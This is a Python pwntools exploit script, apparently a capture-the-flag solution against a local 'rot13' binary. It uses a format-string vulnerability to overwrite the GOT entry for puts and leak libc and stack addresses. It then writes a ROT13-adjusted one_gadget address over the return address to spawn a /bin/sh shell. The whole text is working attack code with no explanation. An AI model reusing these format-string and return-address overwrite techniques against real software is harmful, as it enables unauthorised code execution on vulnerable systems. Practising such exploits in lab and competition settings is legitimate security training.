from pwn import *
import string
# context.log_level = 'debug'

TARGET = './rot13'
LIBC = './libc-2.27.so'
HOST = 'localhost'
PORT = 10004

# r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
r = remote(HOST, PORT)

gdb.attach(r, '''
b*0x0000000000400942
b*0x400961
c
''')
elf = ELF(TARGET)
libc = ELF(LIBC)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))



value = elf.sym['main']
target = elf.got['puts']

payload = ''
payload += '%43$c%40$c'
payload += '%' + str(value-28) + 'p%12$a'
payload = payload.ljust(0x20, 'A')
payload += p64(target)
r.sendline(payload)
leak = int(r.recv(14), 16)
stack_leak = int(r.recv(14), 16)
base = leak - 0x21b97
ret = stack_leak - 0xd8

system = base + libc.sym['system']
binsh = base + next(libc.search("/bin/sh"))
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one = base + gadget[0]
'''
0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rcx == NULL

0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

r.recvuntil('\x18\x10\x60') 
log.info("leak libc & stack")
dbg("base")
dbg("ret")
dbg("one")

z = 0
for i in range(6):
    x = ((one >> (i*8)) & 0xff)
    if chr(x) in string.ascii_lowercase:
        y = x+13
        if y > 0x5a:
            y = y - (0x5b - 0x41)
    elif chr(x) in string.ascii_uppercase:
        y = x+13
        if y > 0x7a:
            y = y - (0x7b - 0x61)
    else:
        y = x

    z += y << (i*8)

one = z
log.info("target routated")
dbg("one")

for i in range(3):
    value = ((one) >> (i*16)) & 0xffff
    target = ret + i*2

    payload = ''
    payload += '%' + str(value) + 'p%12$ua'
    payload = payload.ljust(0x20, 'A')
    payload += p64(target)
    r.sendline(payload)
    # c = chr((ret & 0xff) +i)
    r.recvuntil('\x7f') 

log.info("ret -> one_gadget")
dbg("ret")

value = 0x4005f6
target = elf.got['puts']

payload = ''
payload += '%' + str(value) + 'p%12$ua'
payload = payload.ljust(0x20, 'A')
payload += p64(target)
r.sendline(payload)
r.recvuntil('\x18\x10\x60') 

log.info("destroy loop")

r.interactive()

r.close()
